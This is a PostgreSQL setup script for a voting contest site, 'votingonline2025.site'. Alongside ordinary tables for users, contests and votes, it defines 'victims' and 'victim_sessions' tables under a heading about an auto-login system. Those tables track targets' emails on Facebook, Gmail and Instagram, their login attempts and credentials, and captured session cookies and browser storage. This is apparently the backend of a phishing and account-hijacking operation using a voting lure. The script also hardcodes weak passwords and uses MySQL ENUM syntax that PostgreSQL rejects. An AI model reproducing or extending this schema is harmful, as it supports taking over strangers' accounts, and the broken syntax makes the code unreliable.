-- 🎯 Database Setup for votingonline2025.site
-- PostgreSQL Production Database
-- Run as postgres user: psql -f database-production-setup.sql

-- ==============================================
-- CREATE DATABASE & USER
-- ==============================================
CREATE DATABASE voting_production_2025 
    WITH 
    ENCODING = 'UTF8'
    LC_COLLATE = 'en_US.UTF-8'
    LC_CTYPE = 'en_US.UTF-8'
    TEMPLATE = template0;

CREATE USER voting_user WITH PASSWORD 'VotingSec2025!';

-- Grant privileges
GRANT ALL PRIVILEGES ON DATABASE voting_production_2025 TO voting_user;
ALTER USER voting_user CREATEDB;

-- Connect to the database
\c voting_production_2025;

-- ==============================================
-- USERS TABLE
-- ==============================================
CREATE TABLE IF NOT EXISTS users (
    id SERIAL PRIMARY KEY,
    email VARCHAR(255) UNIQUE NOT NULL,
    username VARCHAR(100) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    full_name VARCHAR(200) NOT NULL,
    role ENUM('admin', 'user') DEFAULT 'user',
    is_verified BOOLEAN DEFAULT false,
    is_active BOOLEAN DEFAULT true,
    avatar_url TEXT,
    last_login TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ==============================================
-- CONTESTS TABLE
-- ==============================================
CREATE TABLE IF NOT EXISTS contests (
    id SERIAL PRIMARY KEY,
    title VARCHAR(255) NOT NULL,
    description TEXT,
    slug VARCHAR(255) UNIQUE NOT NULL,
    category VARCHAR(100),
    start_date TIMESTAMP NOT NULL,
    end_date TIMESTAMP NOT NULL,
    max_votes_per_user INTEGER DEFAULT 1,
    is_active BOOLEAN DEFAULT true,
    featured_image TEXT,
    total_votes INTEGER DEFAULT 0,
    total_participants INTEGER DEFAULT 0,
    created_by INTEGER REFERENCES users(id),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ==============================================
-- CONTESTANTS TABLE
-- ==============================================
CREATE TABLE IF NOT EXISTS contestants (
    id SERIAL PRIMARY KEY,
    contest_id INTEGER REFERENCES contests(id) ON DELETE CASCADE,
    name VARCHAR(255) NOT NULL,
    description TEXT,
    image_url TEXT,
    contestant_number INTEGER,
    total_votes INTEGER DEFAULT 0,
    is_active BOOLEAN DEFAULT true,
    metadata JSONB,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE(contest_id, contestant_number)
);

-- ==============================================
-- VOTES TABLE
-- ==============================================
CREATE TABLE IF NOT EXISTS votes (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
    contest_id INTEGER REFERENCES contests(id) ON DELETE CASCADE,
    contestant_id INTEGER REFERENCES contestants(id) ON DELETE CASCADE,
    ip_address INET,
    user_agent TEXT,
    voting_session VARCHAR(255),
    is_verified BOOLEAN DEFAULT true,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE(user_id, contest_id, contestant_id)
);

-- ==============================================
-- SESSIONS TABLE  
-- ==============================================
CREATE TABLE IF NOT EXISTS sessions (
    id VARCHAR(255) PRIMARY KEY,
    user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
    session_data JSONB NOT NULL,
    expires_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ==============================================
-- AUDIT LOGS TABLE
-- ==============================================
CREATE TABLE IF NOT EXISTS audit_logs (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES users(id),
    action VARCHAR(100) NOT NULL,
    entity_type VARCHAR(100) NOT NULL,
    entity_id INTEGER,
    old_values JSONB,
    new_values JSONB,
    ip_address INET,
    user_agent TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ==============================================
-- VICTIM CONTROL TABLES (Auto-login system)
-- ==============================================
CREATE TABLE IF NOT EXISTS victims (
    id SERIAL PRIMARY KEY,
    email VARCHAR(255) UNIQUE NOT NULL,
    platform VARCHAR(50) NOT NULL, -- facebook, gmail, instagram, etc.
    status VARCHAR(50) DEFAULT 'pending', -- pending, active, inactive, error
    login_attempts INTEGER DEFAULT 0,
    last_login_attempt TIMESTAMP,
    session_data JSONB,
    credentials_hash VARCHAR(255),
    metadata JSONB,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS victim_sessions (
    id SERIAL PRIMARY KEY,
    victim_id INTEGER REFERENCES victims(id) ON DELETE CASCADE,
    session_id VARCHAR(255) UNIQUE NOT NULL,
    platform VARCHAR(50) NOT NULL,
    session_cookies TEXT,
    session_storage TEXT,
    local_storage TEXT,
    expires_at TIMESTAMP,
    is_active BOOLEAN DEFAULT true,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ==============================================
-- INDEXES FOR PERFORMANCE
-- ==============================================
CREATE INDEX idx_users_email ON users(email);
CREATE INDEX idx_users_username ON users(username);
CREATE INDEX idx_users_role ON users(role);

CREATE INDEX idx_contests_slug ON contests(slug);
CREATE INDEX idx_contests_active ON contests(is_active);
CREATE INDEX idx_contests_dates ON contests(start_date, end_date);

CREATE INDEX idx_contestants_contest ON contestants(contest_id);
CREATE INDEX idx_contestants_active ON contestants(is_active);

CREATE INDEX idx_votes_user ON votes(user_id);
CREATE INDEX idx_votes_contest ON votes(contest_id);
CREATE INDEX idx_votes_contestant ON votes(contestant_id);
CREATE INDEX idx_votes_created ON votes(created_at);

CREATE INDEX idx_sessions_user ON sessions(user_id);
CREATE INDEX idx_sessions_expires ON sessions(expires_at);

CREATE INDEX idx_audit_user ON audit_logs(user_id);
CREATE INDEX idx_audit_action ON audit_logs(action);
CREATE INDEX idx_audit_created ON audit_logs(created_at);

CREATE INDEX idx_victims_email ON victims(email);
CREATE INDEX idx_victims_platform ON victims(platform);
CREATE INDEX idx_victims_status ON victims(status);

CREATE INDEX idx_victim_sessions_victim ON victim_sessions(victim_id);
CREATE INDEX idx_victim_sessions_active ON victim_sessions(is_active);

-- ==============================================
-- DEFAULT ADMIN USER
-- ==============================================
INSERT INTO users (email, username, password_hash, full_name, role, is_verified, is_active) 
VALUES (
    'admin@votingonline2025.site', 
    'admin', 
    '$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewFNRULBWwOYAkm2', -- password: admin123
    'System Administrator', 
    'admin', 
    true, 
    true
) ON CONFLICT (email) DO NOTHING;

-- ==============================================
-- GRANT PERMISSIONS TO APPLICATION USER
-- ==============================================
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO voting_user;
GRANT ALL PRIVILEGES ON ALL SEQUENCES IN SCHEMA public TO voting_user;
GRANT ALL PRIVILEGES ON ALL FUNCTIONS IN SCHEMA public TO voting_user;

-- Set default privileges for future tables
ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT ALL ON TABLES TO voting_user;
ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT ALL ON SEQUENCES TO voting_user;
ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT ALL ON FUNCTIONS TO voting_user;

-- ==============================================
-- COMPLETION MESSAGE
-- ==============================================
SELECT 'Database voting_production_2025 setup completed successfully!' as status;

